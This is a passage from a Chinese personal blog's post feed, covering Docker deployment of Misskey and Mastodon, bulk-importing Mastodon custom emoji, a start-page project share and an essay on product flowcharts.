proxy_set_header X-Forwarded-Proto https;</span><br><span class="line"></span><br><span class="line">        # For WebSocket</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection $connection_upgrade;</span><br><span class="line"></span><br><span class="line">        # Cache settings</span><br><span class="line">        proxy_cache cache1;</span><br><span class="line">        proxy_cache_lock on;</span><br><span class="line">        proxy_cache_use_stale updating;</span><br><span class="line">        add_header X-Cache $upstream_cache_status;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置文件中的需要修改的内容如下：</p><ul><li>将 example.tld 替换为您准备的域</li><li><code>ssl_certificate</code> 和 <code>ssl_certificate_key</code> 填写你的sslpem和key的文件路径</li><li>如果使用了Cloudflare的CDN，那就要删除56-58行的代码</li></ul><p>至此，如果不出问题你的 Misskey 就搭建完成了，接下来只需要登录创建管理员账号和一系列系统操作便可使用。</p><blockquote><p>Misskey的相关操作和介绍这里附上一篇文章链接跟大家参考：<a href="https://akaito.xyz/post/misskey/">Fediverse 不止 Mastodon——Misskey 介绍</a></p></blockquote><h2 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h2><h3 id="更新容器"><a href="#更新容器" class="headerlink" title="更新容器"></a>更新容器</h3><p>在 <code>misskey</code> 文件夹 下，运行如下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose pull</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h3 id="删除旧数据"><a href="#删除旧数据" class="headerlink" title="删除旧数据"></a>删除旧数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker system prune</span><br></pre></td></tr></table></figure><p>要求确认时输入 y 并回车确认即可</p><h3 id="定时同步更新"><a href="#定时同步更新" class="headerlink" title="定时同步更新"></a>定时同步更新</h3><p>我们可以在宝塔面板的【计划任务】中编写一个脚本，每天定时尝试拉取最新数据并更新；如果已经是最新版本了的话，那就无事发生，脚本内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -f /root/misskey/docker-compose.yml pull</span><br><span class="line">docker-compose -f /root/misskey/docker-compose.yml up -d</span><br><span class="line">docker system prune -f</span><br></pre></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="https://blog.csdn.net/Hshx233/article/details/125277941">用 Docker 简单部署 Misskey 去中心化开源社交平台</a></li><li><a href="https://candinya.com/posts/minimal-misskey-docker-deploy/">使用 Docker 最小化部署 Misskey–Candinya–糖菓・部落</a></li><li><a href="https://candinya.com/posts/play-with-misskey/">搭建一只 Misskey 实例–Candinya–糖菓・部落</a></li><li><a href="https://www.bilibili.com/read/cv15938394">Misskey12.108.1 搭建的几个坑以及几个注意点</a></li><li><a href="https://akaito.xyz/post/misskey/">Fediverse 不止 Mastodon——Misskey 介绍</a></li><li><a href="https://misskey-hub.net/en/">官方文档</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 去中心化 </tag>
            
            <tag> misskey </tag>
            
            <tag> 社交媒体平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mastodon自定义表情批量导入方法</title>
      <link href="/88.html"/>
      <url>/88.html</url>
      
        <content type="html"><![CDATA[<p>首先在 <a href="https://github.com/mashirozx/bilibili_emojis">表情包仓库</a> 下载 <code>.tar.gz</code> 后缀的四个文件</p><p><img src="https://cos.gjcloak.xyz/pigo/202206231337513.png?imageMogr2/format/webp/interlace/1/quality/80" alt="image-20220623133752356" title="image-20220623133752356"></p><blockquote><p>表情前缀需要增加前缀，<code>emoji.tar.gz</code> 须加上 <code>bili_emoji_</code> 前缀，剩下三个须加上 <code>bili_</code> 前缀</p></blockquote><p>然后在docker管理器找到mastodon的web容器，点击终端<img src="https://cos.gjcloak.xyz/pigo/202206231204322.png?imageMogr2/format/webp/interlace/1/quality/80" alt="image-20220623120403855" title="image-20220623120403855"></p><p>可以使用 <code>wget</code> 指令把四个修改完的包下载到容器里，文件格式要求<code>.tag.gz</code></p><p><img src="https://cos.gjcloak.xyz/pigo/202206231343928.png?imageMogr2/format/webp/interlace/1/quality/80" alt="image-20220623134323901" title="image-20220623134323901"></p><p>可以使用 <code>ls</code> 或者 <code>ls -a</code> 进行查看文件</p><p>然后使用<a href="https://docs.joinmastodon.org/admin/tootctl/#emoji">官网的命令</a> 把表情包批量导入,[path]为表情文件路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tootctl emoji import [path]</span><br></pre></td></tr></table></figure><p>导入完成后，可以在自定义表情页面进行分类</p><p><img src="https://cos.gjcloak.xyz/pigo/202206231344192.png?imageMogr2/format/webp/interlace/1/quality/80" alt="image-20220623134442534" title="image-20220623134442534"></p><p>分完类，即可完成表情导入，可以在发嘟文的时候选择自己上传的表情了</p><p><img src="https://cos.gjcloak.xyz/pigo/202206231345433.png?imageMogr2/format/webp/interlace/1/quality/80" alt="image-20220623134552121" title="image-20220623134552121"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 方法 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> mastodon </tag>
            
            <tag> 导入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Snavigation】一款简约起始页</title>
      <link href="/cf75c125.html"/>
      <url>/cf75c125.html</url>
      
        <content type="html"><![CDATA[<p>【Snavigation】一款简约起始页丨支持自定义搜索引擎丨自定义快捷方式丨自定义壁纸及数据备份</p><p><img src="https://cos.gjcloak.xyz/pigo/snavigation001.png?imageMogr2/format/webp/interlace/1/quality/80" alt="image-20220615151451199" title="image-20220615151451199"></p><h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><p>由于 CDN 缓存原因，查看最新效果可能需要 + 强制刷新浏览器缓存<code>Ctrl+F5</code></p><ul><li><a href="http://beta.gjcloak.top/">公爵起始页</a></li></ul><h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><ul><li>载入动画</li><li>搜索引擎切换</li><li>时间及天气显示</li><li>快捷方式自定义</li><li>网站背景自定义</li><li>数据备份及恢复</li><li>移动端适配</li></ul><p><a href="https://github.com/imsyy/Snavigation">GITHUB项目下载地址</a></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Snavigation </tag>
            
            <tag> 简约 </tag>
            
            <tag> 起始页 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>业务流程图分享</title>
      <link href="/86.html"/>
      <url>/86.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>在看文章时，我们时不时会碰到各种流程图：业务流程图、功能流程图、页面流程图、用户操作流程图、系统流程图等等这些叫得出名叫不出名的流程图，这着实让人头痛不已，这里公爵分享一些自己对于流程图的理解，着重介绍产品中会用到的相关流程图，希望能够抛砖引玉。</p></blockquote><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>百度百科：以特定的图形符号加上说明，表示算法的图，称为流程图或框图；</p><p>智库百科：流程图是流经一个系统的信息流、观点流或部件流的图形代表；</p><p>维基百科：A flowchart is a type of diagram that represents an algorithm, workflow or process, showing the steps as boxes of various kinds, and their order by connecting them with arrows. This diagrammatic representation illustrates a solution model to a given problem.</p><p>（译文：流程图是一类代表算法、工作流或过程的图表，它通过一些用箭头连接的各类图形来展示其中的步骤。这类图形表示方法常用来阐述一个给定问题的解决模型。）</p><p><strong>通俗来说，流程图就是一个有特定逻辑顺序的步骤地图，在这份地图的帮助下，我们可以预知某类步骤走法所能到达的终点，同时，我们也可以通过这份地图找到某个目的地的具体实现路径。</strong></p><h2 id="种类"><a href="#种类" class="headerlink" title="种类"></a>种类</h2><p>维基百科原文引述Types部分：</p><p>Sterneckert (2003) suggested that flowcharts can be modeled from the perspective of different user groups (such as managers, system analysts and clerks) and that there are four general types:</p><ul><li>Document flowcharts, showing controls over a document-flow through a system</li><li>Data flowcharts, showing controls over a data-flow in a system</li><li>System flowcharts, showing controls at a physical or resource level</li><li>Program flowchart, showing the controls in a program within a system</li></ul><p>Notice that every type of flowchart focuses on some kind of control, rather than on the particular flow itself。</p><p>However, there are several of these classifications. For example, Andrew Veronis (1978) named three basic types of flowcharts: the <em>system flowchart</em>, the <em>general flowchart</em>, and the <em>detailed flowchart</em>.<a href="https://en.wikipedia.org/wiki/Flowchart#cite_note-11">[11]</a> That same year Marilyn Bohl (1978) stated “in practice, two kinds of flowcharts are used in solution planning: <em>system flowcharts</em> and _program flowcharts_…”.<a href="https://en.wikipedia.org/wiki/Flowchart#cite_note-12">[12]</a> More recently Mark A Fryman (2001) stated that there are more differences: “Decision flowcharts, logic flowcharts, systems flowcharts, product flowcharts, and process flowcharts are just a few of the different types of flowcharts that are used in business and government”.</p><blockquote><p>大意：</p><p>Sterneckert在2003年提出流程图可以根据不同的用户群（例如管理人员、系统分析师、书记员）这个角度来绘制，并且划分出了四种常用的种类：</p><p><strong>文档流程图：展示经过一个系统中的文档流的控制；</strong></p><p>*数据流程图：展示对一个系统中数据流的控制；</p><p>系统流程图：展示对于物理层面或资源层面上的控制；</p><p>程序流程图：展示一个系统中对于程序的控制；**</p><p>值得注意的是：相较于特定的流程图本身，每一类流程图都更关注于某一种类型的控制。</p><p>然而，这些分类还有好几种。比如说，Andrew Veronis (1978)命名了3类基本种类的流程图：系统流程图、通用流程图、详细流程图。同一年，Marilyn Bohl提出：“事实上，在解决方案规划领域有2类流程图：系统流程图和程序流程图”；离现在更近的是2001的Mark A Fryman，他提出：“在商业和管理领域，流程图有更多的种类如决策流程图、逻辑流程图、系统流程图、产品流程图、过程流程图”</p><p>在上文中我想强调与重申的是“Notice that every type of flowchart focuses on some kind of control, rather than on the particular flow itself。”</p><p><strong>相较于特定的流程图本身，每一类流程图都更关注于某一种类型的控制。</strong></p></blockquote><p>看到这里，坚强如你是不是也得吐槽一句：“真是B了狗，怎么就没有一个固定的标准，我怎么数得清有多少种，说不定明天又出来一种新类型的流程图”。其实，在这里我引用这么一大段东西，不止是为了让大家吐槽。更是想要传递一个观点：“现实世界中不像程序中那么非0即1，某件事物的定义或定性没有一个统一的标准是不难见到的。”但中式教育似乎又更加严格强调标准答案这个概念，就如我们小时候，教材被视为绝对的真理，语文课上考察背诵时，就需一字不多不少得背下来，句子中加个语气助词“了”可能都算错。种种这种类似的经验就很容易造就了一堆死记硬背的读书人，当他们遇到一个新概念时就会查看其定义，如果定义有严格的标准，那就不管是否已经理解先背下来（当然，这种背诵行为不是说不好），但如果缺乏一份严格的标准，他们就会惊慌失措，不知道何去何从。在互联网产品行业，其中许多标准与规范也没有达成共识，这就需要我们勇于探索和总结了，希望这段话能够给鼓励一些迷茫于没有标准教材学习的朋友。</p><p>话题扯回来，对于PM，我们经常接触到的流程图又有哪些种类呢？按照产品设计过程中的时间先后顺序，我想分享一下自己对于<strong>产品业务流程图、产品功能流程图、产品页面流程图</strong>的思考和总结（这里请注意我们将讨论前提限制在了产品领域）。</p><h2 id="标准"><a href="#标准" class="headerlink" title="标准"></a>标准</h2><p>虽然流程图的类别没有严格的分类标准，但对于其图形表达已经有一套基本的共识。在介绍具体的流程图前，我们先对常用的图形标准达成共识：</p><p><img src="https://cos.gjcloak.xyz/pigo/202206101429966.png?imageMogr2/format/webp/interlace/1/quality/80" alt="img" title="img"></p><h1 id="产品业务流程图"><a href="#产品业务流程图" class="headerlink" title="产品业务流程图"></a>产品业务流程图</h1><h2 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a><strong>1. 定义</strong></h2><p><strong>产品业务流程图就是通过图形化的表达形式，阐述产品在业务层面控制的图表。</strong>产品业务流程图通常作为产品设计初期阶段的工具使用，通过图形化，能够更清晰、直观地传达产品在业务层面的控制（如业务动作、方向、逻辑等信息）。</p><h2 id="2-作用"><a href="#2-作用" class="headerlink" title="2. 作用"></a><strong>2. 作用</strong></h2><p>业务流程图通常用于介绍产品业务，如产品经理需要向老板介绍产品业务时，用流程图辅助讲解的效果，相较于纯语言或文字表达要好得多。</p><p>绘制业务流程图的过程能够帮助PM根据产品定位对产品业务进行设计、分析与优化。</p><h2 id="3-实例"><a href="#3-实例" class="headerlink" title="3. 实例"></a><strong>3. 实例</strong></h2><p>注：这里我们以ofo小黄车为例，粗略地绘制其业务流程图、功能流程图、页面流程图，希望能够帮助理解</p><p><img src="https://cos.gjcloak.xyz/pigo/202206101432739.png?imageMogr2/format/webp/interlace/1/quality/80" alt="img" title="img"></p><h1 id="产品功能流程图"><a href="#产品功能流程图" class="headerlink" title="产品功能流程图"></a>产品功能流程图</h1><h2 id="1-定义-1"><a href="#1-定义-1" class="headerlink" title="1. 定义"></a><strong>1. 定义</strong></h2><p><strong>产品功能流程图就是通过图形化的表达形式，阐述产品在功能层面控制的图表。</strong>产品功能流程图通常作为产品设计中期阶段的工具使用，通过图形化，能够更清晰、直观地传达产品在功能层面的控制（如功能动作、方向、逻辑等信息）。</p><h2 id="2-作用-1"><a href="#2-作用-1" class="headerlink" title="2. 作用"></a><strong>2. 作用</strong></h2><p>功能流程图通常用于介绍产品功能模块的相互关系或某个功能模块的具体组成，如产品经理需要向开发人员介绍某个新增功能模块时，可以在原型图宣讲之前使用功能流程图让其对功能的轮廓和走向了然于胸。</p><p>绘制功能流程图的过程能够帮助PM确定产品的功能范围同时避免不合理的功能使用逻辑。</p><h2 id="3-实例-1"><a href="#3-实例-1" class="headerlink" title="3. 实例"></a><strong>3. 实例</strong></h2><p><img src="https://cos.gjcloak.xyz/pigo/202206101432540.png?imageMogr2/format/webp/interlace/1/quality/80" alt="img" title="img"></p><h1 id="产品页面流程图"><a href="#产品页面流程图" class="headerlink" title="产品页面流程图"></a>产品页面流程图</h1><h2 id="1-定义-2"><a href="#1-定义-2" class="headerlink" title="1.定义"></a><strong>1.定义</strong></h2><p><strong>产品页面流程图就是通过图形化的表达形式，阐述产品在页面层面控制的图表。</strong>产品页面流程图通常作为产品设计后期阶段的工具使用，通过图形化，能够更清晰、直观地传达产品在页面层面的控制（如页面功能和信息、方向、逻辑等信息）。</p><h2 id="2-作用-2"><a href="#2-作用-2" class="headerlink" title="2. 作用"></a><strong>2. 作用</strong></h2><p>页面流程图通常用于介绍产品页面元素及页面之间的跳转关系。</p><p>产品页面流程图一般由专门的交互设计师进行设计，其绘制过程能够帮助交互设计师确定产品页面之间合理自然的跳转顺序以及页面本身的功能及信息构成。</p><h2 id="3-实例-2"><a href="#3-实例-2" class="headerlink" title="3.实例"></a><strong>3.实例</strong></h2><p><img src="https://cos.gjcloak.xyz/pigo/202206101434414.png?imageMogr2/format/webp/interlace/1/quality/80" alt="img" title="img"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过上面的实例我们不难发现：业务流程图、功能流程图、页面流程图的主要区别在于矩形图形（流程或节点）的内容的所处层次，其分别对应着<strong>业务动作、功能动作、页面功能和信息。</strong></p><p><strong>整体上来说，产品业务流程图、功能流程图、页面流程图分别是产品设计阶段早、中、晚时期的阶段性产物。</strong>在产品设计阶段，从业务到功能再到具体页面设计，这是一个抽象到具体实现的过程，也是产品概念转变为产品介质的核心过程。在这个过程中，产品业务确定了产品功能范围，产品功能又进一步确定了页面的实现范围。</p><p>最后，公爵整理了引言中涉及到的各类流程图的对比关系图</p><p><img src="https://cos.gjcloak.xyz/pigo/202206101435520.png?imageMogr2/format/webp/interlace/1/quality/80" alt="img" title="img"></p><h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>现在你还在意能否数清流程图的种类吗？其实流程图就是一个图形化的表达工具，其绘制过程能够帮助我们思考系统在某个层面的控制，流程图本身的图形化表达也能更简洁、清晰的传达系统在某个层面的控制信息（节点、流转方向等）。对于这个工具，我们最好不要钻牛角地非要数清流程图的“界门纲目科属种”（如上文介绍也没有这么一个通用的标准），根据实际情况灵活使用和理解才是第一位。</p><p><strong>参考:</strong></p><p>（1）<a href="https://en.wikipedia.org/wiki/Flowchart#Types">维基百科：流程图</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分享 </tag>
            
            <tag> 业务 </tag>
            
            <tag> 流程图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记Mastodon（长毛象）的搭建</title>
      <link href="/85.html"/>
      <url>/85.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><img src="https://cos.gjcloak.xyz/file/image-1653380342727.png" alt="image-1653380342727" title="image-1653380342727"></p><p>今天使用docker进行安装，为了简化安装，使用了宝塔面板。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.Mastodon比较吃的的是内存，所以建议使用1H2G及以上配置的机器,我这里使用的是2核4G的Debian 11.1 64bit</span><br><span class="line">2.装好宝塔面板</span><br><span class="line">3.安装NGINX</span><br><span class="line">4.一个邮箱</span><br><span class="line">5.一个域名以及SSL证书</span><br></pre></td></tr></table></figure><h1 id="安装docker和docker-compose"><a href="#安装docker和docker-compose" class="headerlink" title="安装docker和docker-compose"></a>安装docker和docker-compose</h1><p>docker的安装比较简单，进入宝塔的应用商店中搜索docker，安装这个Docker管理器就可以了。<br><img src="https://cos.gjcloak.xyz/file/image-1653380476327.png" alt="image-1653380476327" title="image-1653380476327"></p><p>Docker Compose的话，宝塔并不能一并安装，还是需要手动安装的，安装使用<a href="https://docs.docker.com/compose/install/">官网</a>的方法进行。</p><p>安装完成，通过<code>docker-compose version</code>和<code>docker -v</code>进行检测是否安装成功。<br><img src="https://cos.gjcloak.xyz/file/image-1653380850315.png" alt="image-1653380850315" title="image-1653380850315"><br><img src="https://cos.gjcloak.xyz/file/image-1653380874147.png" alt="image-1653380874147" title="image-1653380874147"></p><h1 id="拉取Mastodon镜像"><a href="#拉取Mastodon镜像" class="headerlink" title="拉取Mastodon镜像"></a>拉取Mastodon镜像</h1><p>拉取镜像及下载docker-compose.yml文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /home/mastodon/mastodon</span><br><span class="line">cd /home/mastodon/mastodon</span><br><span class="line">docker pull mashirozx/mastodon</span><br><span class="line">wget https://raw.githubusercontent.com/d1258zzz/mastodon/master/docker-compose.yml</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/file/image-1653381051474.png" alt="image-1653381051474" title="image-1653381051474"></p><p>对于<code>docker pull mashirozx/mastodon</code>，也可以通过docker管理器&#x3D;》镜像管理&#x3D;》获取镜像的对话框中填入 mashirozx&#x2F;mastodon进行拉取，效果一样……</p><p><img src="https://cos.gjcloak.xyz/file/image-1653381255862.png" alt="image-1653381255862" title="image-1653381255862"></p><h1 id="配置Mastodon"><a href="#配置Mastodon" class="headerlink" title="配置Mastodon"></a>配置Mastodon</h1><p>在&#x2F;home&#x2F;mastodon&#x2F;mastodon文件夹中创建空白.env.production文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch .env.production</span><br></pre></td></tr></table></figure><p>在当前目录下用root权限运行以下语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose run --rm web bundle exec rake mastodon:setup</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/file/image-1653381672298.png" alt="image-1653381672298" title="image-1653381672298"></p><p>然后会有一长串的配置需要输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">Your instance is identified by its domain name. Changing it afterward will break things.</span><br><span class="line">Domain name:</span><br><span class="line">这里输入您准备给mastodon的域名。</span><br><span class="line">Do you want to enable single user mode? (y/N)</span><br><span class="line">一般来说都是N，除非你只是用作仅供自己使用的站点，（这样显然少了很多乐趣</span><br><span class="line">Are you using Docker to run Mastodon? (Y/n)</span><br><span class="line">你在用DOCKER运行Mastodon嘛？ Of course！</span><br><span class="line">然后下面关于pgsql和redis的设置直接默认，一路回车就好</span><br><span class="line">PostgreSQL host: db</span><br><span class="line">PostgreSQL port: 5432</span><br><span class="line">Name of PostgreSQL database: postgres</span><br><span class="line">Name of PostgreSQL user: postgres</span><br><span class="line">Password of PostgreSQL user:</span><br><span class="line">Database configuration works! </span><br><span class="line"></span><br><span class="line">Redis host: redis</span><br><span class="line">Redis port: 6379</span><br><span class="line">Redis password:</span><br><span class="line">Redis configuration works! </span><br><span class="line"></span><br><span class="line">Do you want to store uploaded files on the cloud? (y/N)</span><br><span class="line">如果您需要将文件存储在您的对象中，可以Y</span><br><span class="line">Do you want to send e-mails from localhost? (y/N)</span><br><span class="line">默认N，应该也没几个机器能够SMTP发件吧</span><br><span class="line"></span><br><span class="line">这里需要准备一个邮箱，支持stmp发件,并还不能有ssl加密/非常迷惑</span><br><span class="line">我这里用的是126邮箱。</span><br><span class="line"></span><br><span class="line">Do you want to send e-mails from localhost? No</span><br><span class="line">SMTP server: smtp.126.com</span><br><span class="line">SMTP port: 25</span><br><span class="line">SMTP username: @126.com</span><br><span class="line">SMTP password:</span><br><span class="line">SMTP authentication: plain</span><br><span class="line">SMTP OpenSSL verify mode: none</span><br><span class="line">E-mail address to send e-mails &quot;from&quot;: @126.com</span><br><span class="line">Send a test e-mail with this configuration right now? Yes</span><br><span class="line">Send test e-mail to: @qq.com</span><br><span class="line"></span><br><span class="line">This configuration will be written to .env.production</span><br><span class="line">Save configuration? Yes</span><br><span class="line">Below is your configuration, save it to an .env.production file outside Docker:</span><br><span class="line"></span><br><span class="line">然后再下面你就会看到一段很长的内容，是的，他将被写入.env.production，这里有你的配置信息，将他复制下来备用！！！</span><br><span class="line"></span><br><span class="line">Now that configuration is saved, the database schema must be loaded.</span><br><span class="line">If the database already exists, this will erase its contents.</span><br><span class="line">Prepare the database now? Yes</span><br><span class="line">Running RAILS_ENV=production rails db:setup ...</span><br><span class="line"></span><br><span class="line">Database &#x27;postgres&#x27; already exists</span><br><span class="line">Error connecting to Redis on localhost:6379 (Errno::ECONNREFUSED)</span><br><span class="line">Error connecting to Redis on localhost:6379 (Errno::ECONNREFUSED)</span><br><span class="line">Switching object-storage-safely from green to red because Redis::CannotConnectError Error connecting to Redis on localhost:6379 (Errno::ECONNREFUSED)</span><br><span class="line">Error connecting to Redis on localhost:6379 (Errno::ECONNREFUSED)</span><br><span class="line">Done!</span><br><span class="line"></span><br><span class="line">All done! You can now power on the Mastodon server ?</span><br><span class="line"></span><br><span class="line">连不上redis正常，因为这时候redis没有运行……</span><br><span class="line"></span><br><span class="line">Do you want to create an admin user straight away? (Y/n)</span><br><span class="line">配置管理员账号</span><br><span class="line">Username:</span><br><span class="line">E-mail:</span><br><span class="line">Error connecting to Redis on localhost:6379 (Errno::ECONNREFUSED)</span><br><span class="line">Error connecting to Redis on localhost:6379 (Errno::ECONNREFUSED)</span><br><span class="line">Switching object-storage-safely from green to red because Redis::CannotConnectError Error connecting to Redis on localhost:6379 (Errno::ECONNREFUSED)</span><br><span class="line">Error connecting to Redis on localhost:6379 (Errno::ECONNREFUSED)</span><br><span class="line">You can login with the password: xxxxxxxxxxxxxxx</span><br><span class="line">You can change your password once you login.</span><br></pre></td></tr></table></figure><p>这里也要记得将管理员密码复制下来。</p><p>然后马上创建.env.production</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano .env.production</span><br></pre></td></tr></table></figure><p>将复制下来的内容粘贴进去</p><h1 id="启动Mastodon"><a href="#启动Mastodon" class="headerlink" title="启动Mastodon"></a>启动Mastodon</h1><p>启动Mastodon</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>为相应文件夹赋权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chown 991:991 -R ./public</span><br><span class="line">docker-compose down</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h1 id="配置NGINX"><a href="#配置NGINX" class="headerlink" title="配置NGINX"></a>配置NGINX</h1><p>在宝塔中创建新网站，前面准备的域名填给mastodon。</p><p><img src="https://cos.gjcloak.xyz/file/image-1653382011057.png"></p><p>关于这个配置可以参考<a href="https://github.com/mastodon/mastodon/blob/main/dist/nginx.conf">这里</a></p><p>这里贴一下我自己的配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">map $http_upgrade $connection_upgrade &#123;</span><br><span class="line">  default upgrade;</span><br><span class="line">  &#x27;&#x27;      close;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">upstream backend &#123;</span><br><span class="line">    server 127.0.0.1:3000 